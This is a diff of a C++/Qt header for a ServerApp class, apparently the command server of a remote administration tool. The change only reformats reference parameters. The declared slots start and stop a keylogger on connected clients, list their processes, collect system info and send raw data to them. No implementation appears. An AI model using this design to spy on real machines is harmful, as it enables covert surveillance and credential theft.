@@ -26,30 +26,30 @@ class ServerApp : public QObject
 {
     Q_OBJECT
 public:
-    explicit ServerApp(const std::string& envFilePath);
+    explicit ServerApp(const std::string &envFilePath);
     ~ServerApp();
 
     void run();
 
 signals:
-    void clientConnected(const QString& clientInfo, uint32_t sessionId);
-    void clientResponse(const QString& clientInfo, const QString& text);
+    void clientConnected(const QString &clientInfo, uint32_t sessionId);
+    void clientResponse(const QString &clientInfo, const QString &text);
 
 public slots:
-    void onGetInfoSys(const QString& clientId);
-    void onStartKeylogger(const QString& clientId);
-    void onStopKeylogger(const QString& clientId);
-    void onRequestProcessList(const QString& clientId, bool namesOnly);
-    void onSendToClient(const QString& clientInfo, const QByteArray& data);
+    void onGetInfoSys(const QString &clientId);
+    void onStartKeylogger(const QString &clientId);
+    void onStopKeylogger(const QString &clientId);
+    void onRequestProcessList(const QString &clientId, bool namesOnly);
+    void onSendToClient(const QString &clientInfo, const QByteArray &data);
 
 private:
     // Internal helper to send raw data to client by clientId string
-    void sendToClientInternal(const QString& clientId, const QByteArray& data);
+    void sendToClientInternal(const QString &clientId, const QByteArray &data);
 
     // Helper pieces used by run() to keep it short:
-    void prepareFdSet(fd_set& readfds, int& maxFd, int& listenFd);
-    void acceptNewClientIfAny(const fd_set& readfds, int listenFd);
-    void processClient(size_t& idx, const fd_set& readfds, uint32_t& nextSessionId);
+    void prepareFdSet(fd_set &readfds, int &maxFd, int &listenFd);
+    void acceptNewClientIfAny(const fd_set &readfds, int listenFd);
+    void processClient(size_t &idx, const fd_set &readfds, uint32_t &nextSessionId);
 
     LPTF_Socket m_serverSocket;
     std::vector<std::unique_ptr<LPTF_Socket>> m_clients;
